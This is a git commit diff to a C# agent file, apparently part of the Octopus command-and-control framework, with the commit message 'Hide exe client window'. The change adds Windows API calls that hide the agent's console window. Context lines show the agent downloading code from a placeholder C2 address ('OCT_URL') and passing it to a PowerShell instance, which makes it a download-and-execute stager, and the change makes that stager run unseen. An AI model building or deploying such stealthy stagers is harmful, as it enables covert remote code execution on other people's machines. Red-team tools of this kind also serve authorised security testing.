bb2f50cd2e1ff92070f309ba76f1258da5292ec0
askar <m.askar@isecur1ty.org>
2020-01-01 14:01:06 +0200

    Hide exe client window

--- agents/octopus.cs
+++ agents/octopus.cs
@@ -1,4 +1,5 @@
 using System.Management.Automation;
+using System.Runtime.InteropServices;
 using System.Net;
 using System;
 
@@ -6,8 +7,18 @@ namespace TT
 {
     class NoT
     {
+	[DllImport("kernel32.dll")]
+	static extern IntPtr GetConsoleWindow();
+	
+	[DllImport("user32.dll")]
+	static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
         static void Main()
         {
+
+		var Console = GetConsoleWindow();
+		ShowWindow(Console, 0);
+
 		WebClient client = new WebClient();
 		String code = client.DownloadString("OCT_URL");
 		PowerShell ps = PowerShell.Create();
